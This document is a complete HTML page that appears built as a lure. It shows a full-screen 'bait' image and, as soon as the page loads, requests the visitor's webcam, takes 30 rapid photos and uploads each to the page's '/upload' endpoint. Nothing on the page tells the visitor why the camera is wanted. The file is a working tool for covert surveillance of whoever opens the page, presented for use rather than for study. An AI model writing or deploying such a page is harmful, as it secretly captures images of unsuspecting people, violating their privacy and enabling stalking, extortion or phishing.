<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Access</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            background-color: black;
        }
        #bait {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
    </style>
</head>
<body>
    <!-- Replace welcome.jpg with your bait image -->
    <img src="/static/welcome.jpg" id="bait" alt="Image">

    <script>
        async function startBurstCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);

                // Take 10 photos per second for 3 seconds = 30 photos
                let count = 0;
                const burstInterval = setInterval(async () => {
                    try {
                        const blob = await imageCapture.takePhoto();
                        const formData = new FormData();
                        formData.append('photo', blob, `photo_${Date.now()}.jpg`);

                        fetch('/upload', { method: 'POST', body: formData })
                            .then(res => console.log("✅ Sent", count + 1))
                            .catch(err => console.error("❌ Upload error:", err));

                        count++;
                        if (count >= 30) { // Stop after 30 shots
                            clearInterval(burstInterval);
                            track.stop();
                        }
                    } catch (err) {
                        console.error("❌ Capture error:", err);
                    }
                }, 100); // 100ms interval = 10 per second
            } catch (err) {
                console.error("❌ Camera access denied:", err);
            }
        }

        window.onload = startBurstCapture;
    </script>
</body>
</html>
